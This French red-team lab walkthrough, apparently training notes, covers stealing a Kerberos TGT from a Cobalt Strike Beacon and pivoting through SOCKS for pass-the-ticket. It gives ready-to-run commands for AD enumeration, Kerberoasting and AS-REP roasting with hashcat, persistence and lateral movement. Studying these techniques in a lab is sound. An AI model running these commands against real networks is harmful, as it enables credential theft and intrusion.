# Lab — Pivoting SOCKS

> **Objectif :** obtenir un ticket de service LDAP et utiliser un proxy SOCKS pour énumérer le domaine avec l’identité d’un utilisateur, sans lire directement la mémoire de LSASS.  

**Résumé du déroulement du lab :**
```
SYSTEM Beacon → krb_dump rsteel TGT → socks proxy on beacon
→ Attacker Desktop: DNS hosts → Proxifier → runas /netonly
→ Rubeus asktgs LDAP ticket → PTT → RSAT enumeration through proxy
```

## Prérequis

>`krb_triage` et `krb_dump` sont des commandes BOF disponibles après le chargement de Kerbeus-BOF dans le client Cobalt Strike.  

```
Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

## Vérifier le Beacon SYSTEM

Dans Cobalt Strike, sélectionner le Beacon de la workstation cible. Vérifier que la session possède bien les privilèges SYSTEM.

```cs
getuid
```

`OPSEC-🟢SAFE` — commande intégrée exécutée dans le thread du Beacon, sans processus enfant.

> **Pourquoi SYSTEM ?** Ce contexte permet d’interroger les tickets Kerberos de plusieurs sessions de la machine, dont la session interactive de `rsteel`. Un Beacon de moindre intégrité ne dispose pas nécessairement de ces accès.

---

### Lister les tickets Kerberos en cache

```cs
krb_triage
```

`OPSEC-🟢SAFE` dans ces notes — BOF utilisant les API Kerberos depuis le Beacon, sans lancer de processus enfant. Cette qualification ne garantit pas l’absence de télémétrie EDR.

> **Points à relever dans la sortie :**
> - Chercher l’entrée avec `User: rsteel` et `Service: krbtgt` : elle correspond au TGT.
> - Noter le LUID de session (par exemple `0x3e7`) pour identifier précisément la session de connexion.
> - Les tickets `krbtgt` sont des TGT ; les entrées `ldap` ou `cifs` sont des tickets de service.
> - Contrôler la date d’expiration du ticket, dont la durée de validité dépend de la politique Kerberos.

---

### Exporter le TGT de `rsteel`

>Exporter le TGT associé à l’utilisateur `rsteel`.  

```cs
krb_dump /user:rsteel /service:krbtgt
```

`OPSEC-🟢SAFE` dans ces notes — le BOF utilise les API Kerberos (`LsaCallAuthenticationPackage` et `KerbRetrieveEncodedTicketMessage`). La sortie contient un ticket `.kirbi` encodé en Base64.

> L’exécution directe de `mimikatz` dans le Beacon est classée `OPSEC-🔴UNSAFE`.  
>`execute-assembly Rubeus.exe dump` est classé `OPSEC-🟠CAUTION` car il emploie le mécanisme fork-and-run.  
>`krb_dump` est la méthode privilégiée dans ces notes pour le lab (`OPSEC-🟢SAFE`).

### Enregistrer le ticket encodé

Copier toute la valeur Base64 depuis la console du Beacon.  
Sur l’Attacker Desktop, la coller dans Notepad ou VS Code. Elle sera désignée par `[ENCODED TGT]` dans la suite.  

> **Conseil :** conserver la chaîne Base64 sur une seule ligne. Des retours à la ligne ajoutés lors de la copie peuvent empêcher Rubeus `asktgs` de lire le ticket.

---

## Configurer le proxy SOCKS

> **Principe :** le proxy SOCKS transporte les connexions TCP de l’Attacker Desktop vers le réseau interne via le canal C2 du Beacon. Les outils locaux peuvent ainsi joindre les services du lab à travers le tunnel.

### Démarrer le proxy SOCKS

```cs
beacon> socks 1080 socks5
```

Le port d’écoute `1080` est configuré sur le **team server**, et non directement sur l’hôte cible. Le tunnel utilise le canal C2 existant.

> **Choix du Beacon :** un proxy SOCKS ne nécessite pas systématiquement SYSTEM. Un Beacon de moindre intégrité peut suffire si sa connectivité réseau et ses permissions le permettent.

> **Ports :** `1080` est couramment utilisé pour SOCKS. Plusieurs tunnels nécessitent des ports d’écoute distincts, par exemple `1081` et `1082`.

❗ La configuration du proxy peut ensuite être utilisée depuis les outils locaux ❗  

---

## Résolution DNS depuis l’Attacker Desktop

> **Pourquoi :** l’Attacker Desktop étant hors domaine, son DNS ne résout pas nécessairement les noms internes comme `lon-dc-1` et `contoso.com`. La résolution de noms doit être correcte pour les échanges Kerberos du lab.

### Ajouter les entrées dans le fichier hosts

💡  Ouvrir un terminal **en administrateur** sur l’Attacker Desktop 💡  pour modifier `drivers\etc\hosts`💡  

```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

## Configurer Proxifier

> **Rôle de Proxifier :** certains outils Windows comme Rubeus et les cmdlets RSAT ne prennent pas directement en charge SOCKS. Proxifier redirige leurs connexions TCP vers le proxy défini dans ses règles.

### Ouvrir Proxifier

Ouvrir **Proxifier** depuis le menu Démarrer de Windows, puis sélectionner son icône dans la zone de notification si la fenêtre est réduite.

---

### Définir le serveur proxy

**Profile → Proxy Servers → Add**

| Champ    | Valeur              |
|----------|--------------------|
| Address  | `10.0.0.5`         |
| Port     | `1080`             |
| Protocol | SOCKS Version 5    |

Cliquer sur **OK**.

> Lorsque la fenêtre propose d’utiliser ce proxy par défaut, choisir **No** pour conserver un routage limité aux règles définies.

Cliquer de nouveau sur **OK**.

> Lorsque Proxifier propose de modifier les règles, choisir **Yes**.

---

### Configurer les règles de Proxification

Ajouter une règle :

| Field        | Value                        |
|--------------|------------------------------|
| Nom          | `Beacon`                     |
| Hôtes cibles | `10.10.120.0/23`             |
| Ports cibles | `Any`                        |
| Action       | Proxy SOCKS5 10.0.0.5        |

<img src="/images/Proxification-Rules-target-hosts-network-subnet-proxychains.png">  

Cliquer sur **OK**, puis de nouveau sur **OK**.

> **Pourquoi `/23` ?** Le lab CONTOSO utilise ici `10.10.120.0/23`, qui couvre les réseaux `.120.x` et `.121.x`. Adapter le CIDR au périmètre réellement autorisé permet de limiter le trafic acheminé par le tunnel.

> **Ordre des règles :** Proxifier applique les règles de haut en bas. Placer la règle `Beacon` avant la règle `Direct` pour éviter que les connexions internes passent directement.

---

## Demander un ticket de service LDAP

> **Pourquoi deux étapes ?** Les tickets Kerberos sont liés à une session de connexion. `runas /netonly` ouvre ici une session réseau de type 9 sur l’Attacker Desktop, tandis que Rubeus utilise le ticket Kerberos fourni dans cette session.

### Créer une session réseau CONTOSO

Dans un terminal existant, exécuter la commande suivante sans nécessiter d’élévation :

```powershell
runas /netonly /user:CONTOSO\rsteel powershell.exe
```

Lors de la demande de mot de passe, saisir la valeur d’exemple du lab. Pour une session `/netonly`, cette valeur n’est pas immédiatement vérifiée auprès du domaine ; l’authentification réseau ultérieure utilise le contexte de la session et les tickets disponibles.

> Une nouvelle fenêtre PowerShell s’ouvre avec le contexte réseau `CONTOSO\rsteel`. Exécuter les commandes Rubeus et RSAT suivantes **dans cette fenêtre**.

---

### Demander et importer le ticket LDAP (Pass-the-Ticket)

Dans la nouvelle fenêtre PowerShell ouverte avec `runas` :

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
```

Remplacer `[ENCODED TGT]` par la valeur Base64 complète enregistrée au début du lab.

> 1. Rubeus envoie une requête `TGS-REQ` à `lon-dc-1` via Proxifier et le proxy SOCKS, en utilisant le TGT de `rsteel`.
> 2. Le Domain Controller valide le TGT et délivre un ticket de service LDAP (`TGS-REP`) pour `ldap/lon-dc-1`.
> 3. L’option `/ptt` importe le ticket obtenu dans le cache Kerberos de la session de connexion courante.
>
> **Note OPSEC :** Rubeus s’exécute ici sur l’Attacker Desktop du lab et non sur l’hôte cible. 
> Microsoft Defender peut détecter l’exécutable Rubeus sur l’Attacker Desktop. Les notes d’origine évoquent plusieurs adaptations propres à l’environnement de formation :
> - Renommer l’exécutable utilisé dans l’environnement de lab.
> - Utiliser la configuration de sécurité autorisée et prévue pour les outils du lab.
> - Conserver une configuration validée et documenter les résultats de détection.
>
> **Pourquoi ne pas demander le ticket depuis le Beacon ?**
> Une demande depuis le Beacon placerait le ticket dans la session du poste cible. Dans ce lab, les cmdlets RSAT tournent sur l’Attacker Desktop : le ticket doit donc être disponible dans sa session Kerberos.

---

### Vérifier l’import du ticket

Pour examiner les tickets dans le contexte `/netonly` utilisé ici, vérifier le résultat avec Rubeus :

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

> **Résultat attendu :** une entrée `ldap/lon-dc-1 @ CONTOSO.COM` avec une date d’expiration valide. Si elle manque, vérifier :
> - La chaîne Base64 ne contient pas de retour à la ligne.
> - L’argument `/dc:` utilise un nom d’hôte correctement résolu.
> - La règle Proxifier couvre `10.10.120.0/23` et l’adresse du DC appartient bien à cette plage.

---

## Énumération Active Directory via SOCKS

> **Pourquoi RSAT ?** Ce lab montre comment interroger Active Directory depuis l’Attacker Desktop avec les cmdlets Microsoft et une session Kerberos valide, en acheminant les connexions par SOCKS. Les requêtes LDAP restent observables côté domaine.

Exécuter les commandes suivantes dans la **fenêtre PowerShell ouverte avec `runas`**, où le ticket LDAP est disponible :

```powershell
# Énumérer les objets ordinateur
Get-ADComputer -Filter * -Server lon-dc-1

# Énumérer les comptes utilisateurs
Get-ADUser -Filter * -Server lon-dc-1

# Énumérer les unités d’organisation (OU)
Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
```

`OPSEC-🟢SAFE` dans les notes : les requêtes LDAP transitent par le proxy SOCKS et sont reçues par le Domain Controller. Elles peuvent être consignées et analysées par les mécanismes de journalisation du réseau.

> **Énumération complémentaire pour l’examen**
> ```powershell
> # SPNs (Kerberoast targets)
> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1
>
> # Groups
> Get-ADGroup -Filter * -Server lon-dc-1
> Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive
>
> # Trust relationships
> Get-ADTrust -Filter * -Server lon-dc-1
>
> # GPOs
> Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
> ```

> **Fin du lab :** extraction d’un ticket avec un BOF, tunnel SOCKS, routage Proxifier, Pass-the-Ticket Kerberos et énumération LDAP depuis les outils locaux.

---

## Dépannage — proxy SOCKS indisponible

> **Symptôme :** les logs Proxifier affichent `error: Could not connect through proxy 10.0.0.5:1080 - Reading proxy reply on a connection request timed out`. Les connexions auparavant fonctionnelles échouent pendant la session.

**Cause possible :** si le Beacon ne communique plus avec le team server, les connexions SOCKS peuvent expirer même lorsque Proxifier semble correctement configuré.

### Vérifier si le Beacon est encore actif

Dans Cobalt Strike, consulter l’heure du dernier callback du Beacon.

- **Callback récent** → le Beacon est actif ; vérifier le listener SOCKS.
- **Callback ancien ou Beacon grisé** → le Beacon semble inactif ; vérifier la connectivité.

### Redémarrer le listener SOCKS si le Beacon est actif

```cs
beacon> socks stop
beacon> socks 1080 socks5
```

Tester ensuite la connexion depuis Proxifier avec une commande RSAT. Vérifier le résultat, sans présumer de la réussite.

### Beacon inactif — vérifier la reprise de session

```cs
// Option 1 — COM hijack (DLL Teams) : déclenchement au prochain lancement de Teams
// Option 2 — abonnement WMI : déclenchement manuel via gpupdate depuis une autre session
// Option 3 — reprendre la méthode d’accès initial du lab en absence de persistence
```

Si le Beacon était le seul point d’accès du lab, le tunnel ne peut pas fonctionner tant que la session n’est pas rétablie.

### Adapter l’intervalle sleep lors des tests SOCKS

Les requêtes LDAP volumineuses peuvent être ralenties par l’intervalle de communication du Beacon. Les notes présentent un réglage plus interactif pour ces tests.

```cs
beacon> sleep 0          // mode interactif : callbacks continus, sans pause
// ... exécuter les contrôles nécessitant le proxy SOCKS ...
beacon> sleep 3000 20    // revenir au sleep de 3 secondes et au jitter de 20 %
```

> `OPSEC-🟠CAUTION` — `sleep 0` augmente la fréquence des callbacks et le volume de trafic. Le rétablissement du paramètre normal est nécessaire à la fin du test.


Le port `9389` correspond à Active Directory Web Services (ADWS), utilisé par certaines cmdlets RSAT. Un timeout sur ce port peut bloquer ces commandes.

---

## Après le lab — vérifications pour l’examen

> Après la configuration SOCKS et la première énumération LDAP, cette section regroupe des contrôles complémentaires à effectuer selon le périmètre du lab.

### Vérifier les TGT actifs du poste initial `OPSEC-🟢SAFE`

`krb_triage` permet de recenser les tickets des sessions accessibles depuis le contexte courant et d’identifier leur propriétaire.

```cs
beacon> krb_triage                               // identifier les sessions actives
beacon> krb_dump /user:pchilds /service:krbtgt   // exemple : deuxième utilisateur connecté
beacon> krb_dump /user:<anyuser> /service:krbtgt
```

Noter les dates d’expiration des tickets, qui dépendent de la politique Kerberos du domaine.

### Énumérer les appartenances aux groupes `OPSEC-🟢SAFE`

```powershell
# Dans la fenêtre PowerShell runas contenant le ticket LDAP
Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive
Get-ADGroupMember "Enterprise Admins" -Server lon-dc-1 -Recursive
Get-ADGroupMember "Remote Management Users" -Server lon-dc-1
Get-ADGroupMember "Remote Desktop Users" -Server lon-dc-1

# Examiner les utilisateurs identifiés pendant l’énumération
Get-ADPrincipalGroupMembership <username> -Server lon-dc-1
```

Une appartenance à un groupe privilégié justifie une vérification des droits réellement accordés au compte.

### Vérifier les SPN des comptes de service `OPSEC-🟢SAFE`

Énumérer les SPN et identifier les éventuels comptes leurres avant de sélectionner un compte dans le lab.

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet -Server lon-dc-1 | Select SamAccountName,ServicePrincipalName,PasswordLastSet
```

> Si `oracle_svc` ou `mssql_svc` ne présentent aucun SPN, la méthode Kerberoasting classique ne s’applique pas à ces comptes. Examiner séparément les propriétés de préauthentification Kerberos.

### Tester les SPN ciblés avec Kerberoasting `OPSEC-🟠CAUTION`

Dans le lab, utiliser uniquement les comptes autorisés et identifiés :

```cs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:oracle_svc /nowrap
```

Le bloc suivant présente l’analyse hors ligne des hashes dans l’environnement Kali :

```bash
hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Vérifier les comptes concernés par AS-REP Roasting `OPSEC-🟠CAUTION`

Examiner les paramètres de préauthentification lorsque cela fait partie du périmètre :

```powershell
# Contrôler l’attribut directement avec RSAT
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth -Server lon-dc-1
```

Si un compte correspond aux critères :

```cs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:<account> /format:hashcat /nowrap
```

```bash
hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Identifier les serveurs Active Directory Certificate Services `OPSEC-🟢SAFE`

Les machines dont le nom contient `-CS-` ou `-CA-` peuvent héberger des services ADCS ; vérifier leur rôle par LDAP.

```powershell
Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -SearchBase "CN=Configuration,DC=contoso,DC=com" -Properties * -Server lon-dc-1 | Select Name,dNSHostName

# Lister les templates et examiner le flag ESC1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com" -Filter * -Properties msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,Name -Server lon-dc-1 | Select Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag
```

Si ADCS est présent, poursuivre l’étude des configurations de certificats dans le module dédié.

### Énumérer les ACL et les permissions de délégation `OPSEC-🟠CAUTION`

```cs
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "rsteel|pchilds|dyork"} | Select ObjectDN,ActiveDirectoryRights,IdentityReferenceName
```

Examiner les permissions `WriteDACL`, `GenericWrite`, `GenericAll`, `ForceChangePassword` et `WriteOwner` sur les objets AD. Leur impact dépend du contexte et des relations entre objets.

### Lateral Movement — ordre des vérifications

Après validation d’un compte ou d’un ticket autorisé dans le lab :

```cs
// Vérifier le contexte d’impersonation avant de poursuivre
beacon> steal_token <pid>                           // OPSEC-🟢SAFE — méthode privilégiée dans ces notes
beacon> kerberos_ticket_use <path-to.kirbi>         // importer un TGT précédemment exporté

// Poursuivre selon le classement OPSEC de ces notes
beacon> jump winrm64 <target> smb                   // OPSEC-🟢SAFE — premier choix dans ces notes
beacon> jump scshell64 <target> smb                 // OPSEC-🟠CAUTION — ne crée pas le service décrit par l’événement 7045
beacon> remote-exec wmi <target> <payload-path>     // OPSEC-🟠CAUTION — exécution WMI sans création de service
beacon> jump psexec64 <target> smb                  // OPSEC-🔴UNSAFE — dernier recours dans le lab

beacon> rev2self                                    // abandonner le token d’impersonation lorsque l’opération est terminée
```
